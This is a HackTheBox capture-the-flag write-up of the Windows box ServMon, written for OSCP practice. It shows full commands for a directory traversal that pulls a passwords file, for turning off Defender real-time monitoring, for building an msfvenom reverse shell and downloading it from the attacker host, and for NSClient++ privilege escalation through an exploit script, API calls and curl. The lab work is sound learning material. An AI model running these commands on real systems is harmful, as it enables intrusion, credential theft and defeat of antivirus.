---
layout: writeup
title: ServMon - HackTheBox
date: 2024-08-21 13:32:20 +0300
description: A Writeup of the ServMon Box from HackTheBox
image: # /assets/images/ServMon/ServMon.png
fig-caption: # Add figcaption (optional)
tags: [TJ Null, LainKusanagi, Windows, Active Directory]
---

![ServMon1.png](/assets/images/ServMon/ServMon1.png){: .responsive-image}

Today I'm doing a writeup for a [Hack The Box](https://app.hackthebox.com/profile/2013658) box from both TJ Null’s OSCP [lab prep list](https://docs.google.com/spreadsheets/u/1/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview#)and LainKusanagi’s [list of OSCP like machines](https://www.reddit.com/r/oscp/comments/1c8pzyz/lainkusanagi_list_of_oscp_like_machines/). It is called ServMon, and it is rated Easy by HackTheBox. As usual, we get started with an nmap scan. I'm using my own [custom script](https://github.com/pentestpop/verybasicenum/blob/main/vbnmap.sh) for this which (gives more detail but) shows these open ports:

```
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
5666/tcp open  nrpe
6699/tcp open  napster
8443/tcp open  https-alt
```

A few things jump out here. We have multiple web ports open, SMB, and FTP. We also have a few ports I don't see much with 566 and 6699. Might have to dig a bit more into those after we check the low hanging fruit. First off, we can't access SMB without authentication. But we can access FTP with anonymous, and it looks like we have ultimately two files. 

![ServMon2.png](/assets/images/ServMon/ServMon2.png){: .responsive-image}

We have a user name `Nadine` with a file called `Confidential.txt` and a user named `Nathan` with a file called `Notes to do.txt`. I read them both:

![ServMon3.png](/assets/images/ServMon/ServMon3.png){: .responsive-image}

From this we can deduce that there could be a password.txt file on the `Nathan` user's Desktop, and it should still be there based on the fact that apparently `Nathan` hasn't marked task 3 as complete. For the web ports, we have something called NVMS on port 80. 

![ServMon4.png](/assets/images/ServMon/ServMon4.png){: .responsive-image}


On port 8443, we have a service called `NSClient++`.
![ServMon5.png](/assets/images/ServMon/ServMon5.png){: .responsive-image}
From googling it, it is " a monitoring agent/daemon for Windows systems that works with Nagios." Note that port 5666 appears to be associated with the service Nagios, so there is some crossover there. I start looking for exploits for both, and I find some. I find some directory traversal exploits for NVMS and an Authenticated RCE and a Local Privesc for NSClient++. If I can get the password from `Nathan`'s Desktop from the directory traversal on NVMS, I might be able to use it for the RCE on the NSClient++ port. 

Neither of the directory traversal's from searchsploit/exploit-db work (at least not quickly), but I do find [this one](https://github.com/AleDiBen/NVMS1000-Exploit/blob/master/nvms.py) from github. And I run the exploit: `python3 nvms.py 10.10.10.184 Users/Nathan/Desktop/passwords.txt passwords.txt`, and it works:

![ServMon6.png](/assets/images/ServMon/ServMon6.png){: .responsive-image}

So I check it against smb with `nxc`: `nxc smb 10.10.10.184 -u users.txt -p passwords.txt`, and we get a hit for `Nadine`:`L1k3B1gBut7s@W0rk`. I try to use it with SMB, but I can only read one share (`IPC$`), but there's nothing on it. I try to figure out how to use one of the NSClient++ exploits with the password, and then eventually all of the other passwords in the file, but none of them work. Then I cycle through all of the services `nxc` can check for, but the other required ports aren't open except for SSH. SSH works with those creds though.

![ServMon7.png](/assets/images/ServMon/ServMon7.png){: .responsive-image}

We can grab the `user.txt` file from Nadine's Desktop, and see what else we can find. It doesn't look like we have any interesting permissions, and it doesn't look like we can download winpeas to look around with. I don't find anything interesting with my custom script except notice that there is an unusual `C:\RecData` directory. I download a db file from there, but don't find anything interesting. Then I remember that we do still have the [Local PrivEsc from Exploit-DB for NSClient++](https://www.exploit-db.com/exploits/46802). It says we can grab the web admin password from `c:\program files\nsclient++\nsclient.ini`, and we can indeed find something: 

![ServMon8.png](/assets/images/ServMon/ServMon8.png){: .responsive-image}

It also looks like it may be restricted to localhost, but I can forward the port to my own localhost using `ssh -L 8443:127.0.0.1:8443 Nadine@10.10.10.184`. The next steps of the  exploit require us to enable the `CheckExternalScripts` and `Scheduler`
 modules, but those appear to already be enabled according to `nsclient.ini.`

![ServMon9.png](/assets/images/ServMon/ServMon9.png){: .responsive-image}

The next step involves transferring the `nc.exe` binary to the machine, but that keeps getting removed because of antivirus, so we'll need to find a way around that. I tried to do the same with a reverse shell, but it's the same deal. I couldn't figure out what to do here, and looked it up. The majority of the writeups I saw never encountered this problem or discussed it at all. I wonder a bit if this is a consequence of multiple users using the machine at the same time, like maybe if one of the disabled the firewall then it was just easier for everyone else. Regardless, it's a bit tricky. 

[This writeup](https://medium.com/@Poiint/htb-servmon-write-up-dd3d03ac4f09) gave the command to disable the AV (`powershell Set-MpPreference -DisableRealtimeMonitoring $true`). So that was helpful, but they also basically had to perform the whole exploit twice. Basically the [exploit](https://www.exploit-db.com/exploits/46802) explains how to run a scheduled script and suggests you upload nc.exe and a malicious script, then reset the NSClient++ which will then execute the scheduled script, running the commands that you want. But to disable AV, you would run one scheduled script  so that it would first disable AV, then upload nc.exe and a your own script, then run the exploit again executing the script. It gets complicated, and that user specifically said the box was likely to crash so it had to be quick. 

There are options to perform this from the command line or from the web portal. There is however a third option that I didn't really see when I looked for writeups, perhaps because it is a shortcut for the intended way. That is to go back to the authenticated RCE exploits I tried in the first place. I was trying them with Nadine's password, which worked for SSH or for SMB, but wasn't the admin password for the `NSClient ++` service. So looked for those again, and I found this [authenticated RCE from exploit-db](https://www.exploit-db.com/exploits/48360), and I used it once to disable AV, then upload a msfvenom binary, then again to execute the binary. 

The steps are:
1.  From kali: `python3 nsclient.py -t 127.0.0.1 -P 8443 -p ew2x6SsGTxjRwXOT -c 'powershell Set-MpPreference -DisableRealtimeMonitoring $true'`
2. From kali: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.3 LPORT=445 -f exe -o reverse.exe`
3. From target: `iwr -uri http://10.10.14.3:80/reverse.exe -o C:\temp\everse.exe`
4. From kali: `python3 nsclient.py -t 127.0.0.1 -P 8443 -p ew2x6SsGTxjRwXOT -c 'C:\temp\reverse.exe'`
	1. *Note that this is after I had already forward the 8443 port to my machine, that's why I was able to call localhost, rather than the IP. This exploit would not have worked had that not happened because the service was configured to only accept commands from it's own server.*
	   
And that gets us a shell. 

![ServMon10.png](/assets/images/ServMon/ServMon10.png){: .responsive-image}

From there we can grab root.txt from `C:\Users\Administrator\Desktop\root.txt`, and we're done. 

### Issues
I want to address a couple of things here, because the box is rated Easy, but it also has a 2.1 rating on HTB, which I didn't notice before I started. After reading what other people did to complete it, it sounds like there are some issues that make the performance of the box a little inconsistent. 

First things first, there is a login screen on the NSClient++ application that looks like this:

![ServMon11.png](/assets/images/ServMon/ServMon11.png){: .responsive-image}

This screen did not pop up for me either when I sent the initial request in the browser to the target IP or after I had port forwarded to my localhost. I'm not sure why, though I read a suggestion that chromium was better for this box than firefox, so maybe that had something to do with it. Either way, I had to re-request the initial URL. As in, I had to re-request `https://10.10.10.184:8443`, not the URL that it re-directs to which is `https://10.10.10.184:8443/index.html#/`. This makes a difference because you can't use the GUI after you run the port forward unless you know this. For me, it didn't matter because I used the public exploit, but some writeups I saw either never saw these or didn't have access to them. 

Another issue is that most of the writeups I saw didn't address the AV, and this is a different box without that issue. I'm not sure if something changed with it or not, but only about a third of the writeups I checked mentioned it at all. [One](https://blog.nowhere.moe/HTB/Easy/45.html) even complained that no one else mentioned it, though their solution was to upload [xc](https://github.com/xct/xc) , a netcat like binary written in go-lang, to use instead. I thought that was cool. In any case, the experience for users seems pretty inconsistent, and that's frustrating. It makes me feel like I both got screwed and cheated (because I used exploits that may not have existed).

### Lessons Learned
Interestingly, I kinda had this box figured out pretty early on, I just missed the part where I didn't have the correct password and couldn't actually run commands on the `NSClient++` from my machine. In that sense, every step of this box could be solved with public exploits. We get the location of the first password with FTP (anonymous login), use a public exploit to grab the password, then SSH, then use information from another public exploit to find the location of the second password we need, then we can use a different public exploit to use that password for high level RCE. 

### Further Learning
I don't usually do this, but I'm going to dig into the public exploit I used to exploit NSClinet++ a bit more, and maybe look at some other options, just because I feel like I shouldn't have been able to complete the end as easily as I ultimately did (though I did spend time trying to do things that wouldn't have worked).

Basically there are a three options, but they all do the same thing - create a scheduled task which starts a malicious command, whether that's using `nc` (or an alternative) or executing a reverse shell. 

The exploit I used sends a request to the server endpoint `/settings/external scripts/scripts` to create the task with the parameter `cmd` which we set when we run the command. 

![Screenshot 2024-10-28 at 5.17.11 PM.png](/assets/images/ServMon/Screenshot 2024-10-28 at 5.17.11 PM.png){: .responsive-image}

The exploit also contains functions for:
- generating a random name for the external script (which runs our command)
- building a base url with the IP we provided
- obtaining an authentication token with the password we provided
- restarting the application after making the changes
- making the call to the new external script

When we do this through the web application, we can add the new script in settings. We can see the fields that are created by the exploiting and what they do. In this case they are mostly generating by the exploit, but the `Value` field will ultimately be a executable that contains the command we selected as the parameter. So for my first command to disable AV, the command was this: `python3 nsclient.py -t 127.0.0.1 -P 8443 -p ew2x6SsGTxjRwXOT -c 'powershell Set-MpPreference -DisableRealtimeMonitoring $true'`. That means the `Value` field will ultimately execute the command: `powershell Set-MpPreference -DisableRealtimeMonitoring $true`.

![ServMon12.png](/assets/images/ServMon/ServMon12.png){: .responsive-image}

In the case of the GUI app, we need to ultimately save changes (`Changes` -> `Save`) and then reload the application ourselves.  

![ServMon13.png](/assets/images/ServMon/ServMon13.png){: .responsive-image}
This crashed my lab, but I read that was a possibility, and that you may need to try multiple times. I did not as the lab was already completed, but the next step is to `Queries`, click on the one you create which will be titled in the `Section` field (in our case $scriptName), and then click run. The exploit I used does this, first reloading the application, and then starting this query. 

I tried to figure out how to do this from the command line, but I could not. You should be able to edit the `C:\Program Files\NSClient++\nsclient.ini` to add the script in the right spot. It will look like this where the script is called `reverse_script` and it calls `C:\Users\nadine\reverse.exe`: 
```
; External scripts - A list of scripts available to run from the CheckExternalScripts module. Syntax is: `command=script arguments`
reverse_script = C:\Users\nadine\reverse.exe
```

I was not able to do this because I did not have write privileges over the `nsclient.ini` file. 

There is one final option, which is to use the API. [This](https://github.com/xtizi/NSClient-0.5.2.35---Privilege-Escalation/blob/master/exploit.py) exploit from xtizi does just that. The relevant lines are:
```
response = requests.put(args.host+'/api/v1/scripts/ext/scripts/exploit1.bat', data=args.command, verify=False, auth=('admin', args.password))
print(response)
response = requests.get(args.host+'/api/v1/queries/exploit1/commands/execute?time=1m', verify=False, auth=('admin', args.password))
print(response)
```

Where we send a request to `/api/v1/scripts/ext/scripts/`, creating our script called `exploit1.bat`, which includes the data field where we enter our command. Then we pass a second request which executes it every 1 minute. This worked: `python3 exploit.py 'C:\Users\nadine\reverse.exe' https://127.0.0.1:8443 ew2x6SsGTxjRwXOT` to catch a reverse shell after I had already disabled the AV and uploaded `C:\Users\nadine\reverse.exe` binary. 

We can also do this with curl commands. Here is an example of the two commands required to create the external script to disabled the AV and then to run that external script:
1. `curl -k -X PUT -u admin:ew2x6SsGTxjRwXOT "https://127.0.0.1:8443/api/v1/scripts/ext/scripts/removeAV.bat" -d "powershell Set-MpPreference -DisableRealtimeMonitoring $true"`
	1. In this case, the `-k` flag removes ssl verification (good because we are requesting from port 8443 which defaults to https), and the `-X` flag signifies the request type. The `-u` flag calls the user parameter as definited by the NSClient++ API, and then `-d` flag is to tell it what data to send. 
2. `curl -k -X GET -u admin:ew2x6SsGTxjRwXOT "https://127.0.0.1:8443/api/v1/queries/removeAV/commands/execute?time=1m"`

So there's a little extra deep dive that I feel like helped me become a little more familiar next time I encounter a similar box. 

### Remediation Steps
- Remove the file from the FTP server that suggests where the passwords are, or at least remove the description of where the passwords are. 
- Patch the NVMS server. 
- Patch the NSClient++ server. 